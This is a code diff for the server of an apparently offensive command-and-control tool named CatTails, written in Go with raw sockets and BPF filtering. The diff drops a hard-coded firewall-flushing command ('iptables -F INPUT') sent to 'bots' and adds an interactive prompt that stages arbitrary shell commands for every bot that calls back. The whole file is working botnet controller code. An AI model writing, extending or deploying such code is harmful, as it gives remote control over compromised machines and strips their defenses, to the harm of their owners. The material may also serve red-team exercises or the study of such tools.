@@ -1,9 +1,11 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"log"
 	"net"
+	"os"
 	"strings"
 
 	"github.com/google/gopacket"
@@ -11,7 +13,7 @@ import (
 	"golang.org/x/sys/unix"
 )
 
-var stagedCmd = "iptables -F INPUT"
+var stagedCmd = ""
 
 // Host defines values for a callback from a bot
 type Host struct {
@@ -26,14 +28,16 @@ func sendCommand(iface *net.Interface, src net.IP, dstMAC net.HardwareAddr, list
 	// Forever loop to respond to bots
 	for {
 		bot := <-listen
-		fd := cattails.NewSocket()
-		// Create packet
-		packet := cattails.CreatePacket(iface, src, bot.IP, dstMAC, cattails.CreateCommand(stagedCmd))
+		if stagedCmd != "" {
+			fd := cattails.NewSocket()
+			// Create packet
+			packet := cattails.CreatePacket(iface, src, bot.IP, dstMAC, cattails.CreateCommand(stagedCmd))
 
-		cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
+			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
 
-		fmt.Println("[+] Sent reponse to:", bot.Hostname, "(", bot.IP, ")")
-		unix.Close(fd)
+			fmt.Println("[+] Sent reponse to:", bot.Hostname, "(", bot.IP, ")")
+			unix.Close(fd)
+		}
 	}
 }
 
@@ -60,6 +64,15 @@ func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
 	listen <- newHost
 }
 
+func cli() {
+	for {
+		reader := bufio.NewReader(os.Stdin)
+		fmt.Print("CatTails> ")
+		stagedCmd, _ = reader.ReadString('\n')
+		fmt.Println("[+] Staged CMD:", stagedCmd)
+	}
+}
+
 func main() {
 
 	vm := cattails.CreateBPFVM(cattails.FilterRaw)
@@ -69,8 +82,8 @@ func main() {
 
 	fmt.Println("[+] Created sockets")
 
-	// Make channel
-	listen := make(chan Host)
+	// Make channel buffer by 5
+	listen := make(chan Host, 5)
 
 	// Iface and src ip for the sendcommand func to use
 	iface, src := cattails.GetOutwardIface("8.8.8.8:80")
@@ -86,6 +99,10 @@ func main() {
 	fmt.Println("[+] Starting go routine...")
 	go sendCommand(iface, src, dstMAC, listen)
 
+	// Start CLI
+	go cli()
+
+	// This needs to be on main thread
 	for {
 		// packet := cattails.ServerReadPacket(readfd, vm)
 		packet := cattails.ServerReadPacket(readfd, vm)
